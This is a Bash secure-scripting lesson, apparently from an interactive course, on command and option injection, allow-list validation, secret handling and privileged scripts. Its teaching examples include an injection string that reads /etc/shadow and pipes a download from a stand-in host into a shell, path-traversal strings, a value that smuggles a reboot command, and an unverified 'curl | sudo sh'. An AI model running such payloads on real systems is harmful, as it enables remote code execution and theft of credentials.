---
objectives:
  - Recognise command injection and avoid `eval` and unquoted expansions of untrusted data
  - Validate input with allow-lists instead of trying to block bad characters
  - Handle secrets without leaking them through arguments, logs or the environment
  - Apply least privilege: safe PATH, umask, temp files and careful `sudo` use
summary:
  - "Treat every external value (arguments, files, environment, network) as untrusted data — never as code."
  - "No `eval`, `bash -c \"$input\"` or `ssh host \"$input\"` with untrusted strings; build commands as arrays and use `--` before operands."
  - "Validate with allow-lists: `[[ $name =~ ^[a-z0-9_-]{1,32}$ ]] || die \"invalid name\"`."
  - "Secrets: read from files or stdin, not command-line arguments (visible in `ps`); avoid `set -x` around them; restrict permissions with `umask 077`."
  - "Set a known PATH in privileged scripts, use `mktemp`, and run with the least privilege needed."
related:
  - quoting
  - indirection-and-namerefs
  - temp-files-and-fds
---

## The core rule

A shell script blurs the line between **code** (commands) and **data** (strings). Almost every shell vulnerability comes from data being interpreted as code — through word splitting, globbing, option parsing or explicit evaluation.

## Command injection

```bash
# A "convenient" wrapper:
search() { eval "grep -r $1 /srv/docs"; }
search 'x /etc/shadow; curl evil.sh | sh #'     # runs the attacker's commands
```

| Dangerous | Safe alternative |
|---|---|
| `eval "cmd $input"` | `cmd -- "$input"` |
| `bash -c "process $file"` | `bash -c 'process "$1"' _ "$file"` |
| `ssh host "rm $path"` | `ssh host "rm -- $(printf '%q' "$path")"` |
| `cmd $(cat list)` | `mapfile -t items < list; cmd -- "${items[@]}"` |
| `find … -exec sh -c "x {}" \;` | `find … -exec sh -c 'x "$1"' _ {} \;` |

```bash title="injection.sh" playground
input='report.txt; echo INJECTED'
echo "--- unsafe (eval):"
eval "echo processing $input"
echo "--- safe (argument):"
echo processing "$input"
echo "--- safe bash -c (data passed as \$1):"
bash -c 'echo "processing $1"' _ "$input"
```

Note that `ssh` always joins its arguments into a string that the remote shell parses — quote remote arguments with `printf %q` or pass data via stdin.

## Option injection

A file named `-rf` or `--delete` becomes an **option** if it reaches a command unprotected:

```bash title="option-injection.sh" playground
cd "$(mktemp -d)"
touch -- -n
echo "first line" > data.txt
echo "unsafe: $(cat * 2>&1 | head -1)"       # runs `cat -n data.txt` — the file name became an option!
echo "safe:   $(cat -- * 2>&1 | head -1)"    # runs `cat -- -n data.txt`
```

Use `--` to end options, or prefix globs with `./`.

## Validate with allow-lists

Don't try to strip "dangerous" characters (you'll miss some). Define exactly what's allowed:

```bash title="validate.sh" playground
valid_username() { [[ $1 =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]; }
valid_port()     { [[ $1 =~ ^[0-9]{1,5}$ ]] && (( $1 >= 1 && $1 <= 65535 )); }
valid_env()      { case $1 in dev|staging|prod) return 0 ;; *) return 1 ;; esac; }

for u in deploy "Robert'); DROP" root_2 ""; do
  valid_username "$u" && echo "user ok:  '$u'" || echo "rejected: '$u'"
done
valid_port 8080 && echo "port ok"
valid_port 99999 || echo "port rejected"
valid_env prod && echo "env ok"
```

For paths, resolve and check they stay inside an allowed directory (`realpath`, then `[[ $p == /srv/uploads/* ]]`) to prevent `../../etc/passwd` traversal.

## Secrets

| Leak | Why | Instead |
|---|---|---|
| `mysql -p"$PASS"` | arguments are visible to every user in `ps` / `/proc` | config file with 600 perms, or stdin |
| `export API_TOKEN` | inherited by every child; some tools log their environment | pass only to the command that needs it |
| `set -x` | traces print expanded values | turn tracing off around secrets |
| `echo "$PASS" > file` | default umask makes it world-readable | `umask 077` first, or `install -m 600` |
| hard-coded in the script | ends up in git | a secrets manager, env from CI, or a protected file |

```bash title="secrets.sh" playground
umask 077
secret_file=$(mktemp)
printf '%s\n' 's3cr3t-token' > "$secret_file"
ls -l "$secret_file" | cut -d' ' -f1
read -r token < "$secret_file"
echo "token loaded (${#token} chars): ${token:0:3}***"
rm -f -- "$secret_file"
```

Read passwords interactively with `read -rs` (no echo).

## Privileged scripts

When a script runs as root (sudo, cron, systemd):

- Set `PATH=/usr/sbin:/usr/bin:/sbin:/bin` explicitly — don't trust the caller's.
- Use absolute paths for files; never operate in a world-writable directory without `mktemp`.
- Drop privileges for parts that don't need them: `sudo -u appuser cmd`, `runuser`, `setpriv`.
- Prefer a small, specific `sudoers` rule for one script over giving full sudo.
- Never make shell scripts setuid — Linux ignores setuid on scripts for good reason.

## Common mistakes

```mistake
title: Building SQL or commands by string concatenation
wrong: |
  psql -c "SELECT * FROM users WHERE name = '$name'"
right: |
  psql -v name="$name" -c "SELECT * FROM users WHERE name = :'name'"
why: The same injection principle applies to every language you embed in a script — use the tool's parameter mechanism.
```

```mistake
title: curl | sh without verification
wrong: |
  curl -s https://example.com/install.sh | sudo sh
right: |
  curl -fsSLo install.sh https://example.com/install.sh
  sha256sum -c <<< "EXPECTED_HASH  install.sh"
  less install.sh && sudo sh install.sh
why: You run whatever the server (or a man-in-the-middle, or a truncated download) sends, as root.
```

## Practice

```exercise
kind: mcq
difficulty: intermediate
prompt: Which is the safe way to pass a user-supplied filename to a command run with `bash -c`?
options:
  - "`bash -c \"wc -l $file\"`"
  - "`bash -c 'wc -l \"$1\"' _ \"$file\"`"
  - "`bash -c \"wc -l '$file'\"`"
  - "`eval \"bash -c 'wc -l $file'\"`"
answer: 1
explanation: "The code string is constant; the filename arrives as data in `$1`. Quoting inside the string (option 3) breaks with a `'` in the name."
```

```exercise
kind: find-bug
difficulty: intermediate
prompt: Which line can leak the database password to other users on the machine?
code: |
  #!/usr/bin/env bash
  set -euo pipefail
  read -rs -p "DB password: " pw; echo
  mysqldump -u backup -p"$pw" shop > shop.sql
  echo "dump complete"
answer: 4
fix: |
  MYSQL_PWD=$pw mysqldump -u backup shop > shop.sql   # or use an option file with 600 perms
hints:
  - "Which information about a running process can any user see with `ps aux`?"
explanation: Command-line arguments are world-readable while the process runs.
```

```exercise
kind: command
difficulty: intermediate
prompt: "Set `name='../../etc/passwd'` and print `rejected` unless it matches `^[A-Za-z0-9._-]+$` and doesn't start with a dot."
solution: "name='../../etc/passwd'; [[ $name =~ ^[A-Za-z0-9._-]+$ && $name != .* ]] && echo ok || echo rejected"
explanation: Slashes aren't in the allow-list, so traversal attempts fail validation.
```

## Challenge

```exercise
kind: script
difficulty: advanced
title: Safe archive name
prompt: "Write `safe_name` that takes any string and prints a safe file name: replace every character outside `A-Za-z0-9._-` with `_`, strip leading dots and dashes, truncate to 40 characters, and print `unnamed` if nothing is left. Test with the given inputs."
starter: |
  #!/usr/bin/env bash
  safe_name() {
    :
  }
  safe_name "Quarterly Report (final).pdf"
  safe_name "../../etc/passwd"
  safe_name "-rf --no-preserve-root"
  safe_name "...."
  safe_name 'a;$(reboot)`x`'
solution: |
  #!/usr/bin/env bash
  safe_name() {
    local s=${1//[^A-Za-z0-9._-]/_}
    while [[ $s == [.-]* ]]; do s=${s#?}; done
    s=${s:0:40}
    printf '%s\n' "${s:-unnamed}"
  }
  safe_name "Quarterly Report (final).pdf"
  safe_name "../../etc/passwd"
  safe_name "-rf --no-preserve-root"
  safe_name "...."
  safe_name 'a;$(reboot)`x`'
expectedOutput: |
  Quarterly_Report__final_.pdf
  _.._etc_passwd
  rf_--no-preserve-root
  unnamed
  a___reboot__x_
checks:
  - pattern: eval
    forbid: true
    message: No eval needed.
hints:
  - "`${s//[^A-Za-z0-9._-]/_}` replaces every disallowed character."
  - "Loop while the string starts with `.` or `-`, removing one character each time."
explanation: "An allow-list transform can't be bypassed by characters you didn't think of: anything not explicitly permitted becomes `_`."
```
